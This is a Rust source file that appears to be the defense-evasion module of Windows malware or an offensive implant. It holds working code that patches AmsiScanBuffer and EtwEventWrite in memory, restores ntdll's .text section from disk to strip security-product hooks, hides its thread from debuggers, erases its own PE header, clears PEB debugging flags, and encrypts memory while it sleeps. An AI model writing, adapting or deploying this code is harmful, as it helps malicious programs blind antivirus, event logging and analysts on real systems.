use std::ffi::CString;
use std::ptr;
use std::thread;
use std::time::Duration;

type HANDLE = *mut u8;
type HMODULE = *mut u8;
type FARPROC = *mut u8;
type DWORD = u32;
type BOOL = i32;
type NTSTATUS = i32;

extern "system" {
    fn LoadLibraryA(name: *const u8) -> HMODULE;
    fn GetModuleHandleA(name: *const u8) -> HMODULE;
    fn GetProcAddress(module: HMODULE, name: *const u8) -> FARPROC;
    fn VirtualProtect(addr: *mut u8, size: usize, new: DWORD, old: *mut DWORD) -> BOOL;
    fn GetCurrentThread() -> HANDLE;
    fn GetCurrentProcess() -> HANDLE;
}

const PAGE_EXECUTE_READWRITE: DWORD = 0x40;
const THREAD_HIDE_FROM_DEBUGGER: i32 = 0x11;

pub fn run() {
    if cfg!(not(windows)) { return; }
    let _ = patch_amsi();
    let _ = patch_etw();
    let _ = unhook_ntdll();
    let _ = hide_thread();
    let _ = stomp_pe_header();
    let _ = patch_debug_flags();
}

fn patch_amsi() -> Result<(), ()> {
    unsafe {
        let lib_name = CString::new("amsi.dll").unwrap();
        let lib = LoadLibraryA(lib_name.as_ptr() as *const u8);
        if lib.is_null() { return Err(()); }
        let func_name = CString::new("AmsiScanBuffer").unwrap();
        let addr = GetProcAddress(lib, func_name.as_ptr() as *const u8);
        if addr.is_null() { return Err(()); }
        // mov eax, 0x80070057 (E_INVALIDARG); ret
        let patch: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
        let mut old: DWORD = 0;
        VirtualProtect(addr, patch.len(), PAGE_EXECUTE_READWRITE, &mut old);
        ptr::copy_nonoverlapping(patch.as_ptr(), addr, patch.len());
        VirtualProtect(addr, patch.len(), old, &mut old);
        Ok(())
    }
}

fn patch_etw() -> Result<(), ()> {
    unsafe {
        let ntdll_name = CString::new("ntdll.dll").unwrap();
        let ntdll = GetModuleHandleA(ntdll_name.as_ptr() as *const u8);
        if ntdll.is_null() { return Err(()); }
        let func_name = CString::new("EtwEventWrite").unwrap();
        let addr = GetProcAddress(ntdll, func_name.as_ptr() as *const u8);
        if addr.is_null() { return Err(()); }
        // xor eax, eax; ret
        let patch: [u8; 3] = [0x33, 0xC0, 0xC3];
        let mut old: DWORD = 0;
        VirtualProtect(addr, patch.len(), PAGE_EXECUTE_READWRITE, &mut old);
        ptr::copy_nonoverlapping(patch.as_ptr(), addr, patch.len());
        VirtualProtect(addr, patch.len(), old, &mut old);
        Ok(())
    }
}

fn unhook_ntdll() -> Result<(), ()> {
    unsafe {
        let path = "C:\\Windows\\System32\\ntdll.dll";
        let clean = match std::fs::read(path) {
            Ok(d) => d,
            Err(_) => return Err(()),
        };
        let ntdll_name = CString::new("ntdll.dll").unwrap();
        let ntdll = GetModuleHandleA(ntdll_name.as_ptr() as *const u8);
        if ntdll.is_null() { return Err(()); }

        let e_lfanew = *(ntdll.add(0x3C) as *const i32) as usize;
        let file_header = ntdll.add(e_lfanew + 4);
        let num_sections = *(file_header.add(2) as *const u16) as usize;
        let size_of_optional = *(file_header.add(16) as *const u16) as usize;
        let section_headers = file_header.add(20 + size_of_optional);

        for i in 0..num_sections {
            let sec = section_headers.add(i * 40);
            let mut name_buf = [0u8; 8];
            ptr::copy_nonoverlapping(sec, name_buf.as_mut_ptr(), 8);
            if &name_buf[..5] == b".text" {
                let v_size = *(sec.add(8) as *const u32) as usize;
                let v_addr = *(sec.add(12) as *const u32) as usize;
                let raw_ptr = *(sec.add(20) as *const u32) as usize;
                if raw_ptr + v_size > clean.len() { return Err(()); }
                let text_addr = ntdll.add(v_addr);
                let mut old: DWORD = 0;
                VirtualProtect(text_addr, v_size, PAGE_EXECUTE_READWRITE, &mut old);
                ptr::copy_nonoverlapping(clean.as_ptr().add(raw_ptr), text_addr, v_size);
                VirtualProtect(text_addr, v_size, old, &mut old);
                return Ok(());
            }
        }
        Err(())
    }
}

fn hide_thread() -> Result<(), ()> {
    unsafe {
        let ntdll_name = CString::new("ntdll.dll").unwrap();
        let ntdll = GetModuleHandleA(ntdll_name.as_ptr() as *const u8);
        if ntdll.is_null() { return Err(()); }
        let func_name = CString::new("NtSetInformationThread").unwrap();
        let addr = GetProcAddress(ntdll, func_name.as_ptr() as *const u8);
        if addr.is_null() { return Err(()); }
        let func: extern "system" fn(HANDLE, i32, *mut u8, u32) -> NTSTATUS =
            std::mem::transmute(addr);
        func(GetCurrentThread(), THREAD_HIDE_FROM_DEBUGGER, ptr::null_mut(), 0);
        Ok(())
    }
}

fn stomp_pe_header() -> Result<(), ()> {
    unsafe {
        let base = GetModuleHandleA(ptr::null());
        if base.is_null() { return Err(()); }
        let mut old: DWORD = 0;
        VirtualProtect(base, 64, PAGE_EXECUTE_READWRITE, &mut old);
        *base = 0;
        *(base.add(1)) = 0;
        *(base.add(0x3C) as *mut i32) = 0;
        VirtualProtect(base, 64, old, &mut old);
        Ok(())
    }
}

fn patch_debug_flags() -> Result<(), ()> {
    unsafe {
        let ntdll_name = CString::new("ntdll.dll").unwrap();
        let ntdll = GetModuleHandleA(ntdll_name.as_ptr() as *const u8);
        if ntdll.is_null() { return Err(()); }
        let func_name = CString::new("NtQueryInformationProcess").unwrap();
        let addr = GetProcAddress(ntdll, func_name.as_ptr() as *const u8);
        if addr.is_null() { return Err(()); }
        let func: extern "system" fn(HANDLE, u32, *mut usize, u32, *mut u32) -> NTSTATUS =
            std::mem::transmute(addr);
        let mut pbi: usize = 0;
        let mut ret_len: u32 = 0;
        let status = func(GetCurrentProcess(), 0, &mut pbi, std::mem::size_of::<usize>() as u32, &mut ret_len);
        if status != 0 || pbi == 0 { return Err(()); }
        let peb = pbi as *mut u8;
        *peb.add(2) = 0; // BeingDebugged = false
        let flag_offset = if std::mem::size_of::<usize>() == 8 { 0xBC } else { 0x68 };
        let flags = *(peb.add(flag_offset) as *const u32);
        if flags & 0x70 != 0 {
            *(peb.add(flag_offset) as *mut u32) = flags & !0x70;
        }
        Ok(())
    }
}

pub fn sleep_mask(secs: u64, sensitive: &mut [u8]) {
    let mut key = [0u8; 32];
    for (i, b) in key.iter_mut().enumerate() {
        *b = (i as u8)
            .wrapping_mul(31)
            .wrapping_add(secs as u8)
            .wrapping_add((std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap_or_default()
                .subsec_nanos() >> (i & 7)) as u8);
    }
    for (i, b) in sensitive.iter_mut().enumerate() {
        *b ^= key[i & 31];
    }
    thread::sleep(Duration::from_secs(secs.max(1)));
    for (i, b) in sensitive.iter_mut().enumerate() {
        *b ^= key[i & 31];
    }
    key.iter_mut().for_each(|b| *b = 0);
}
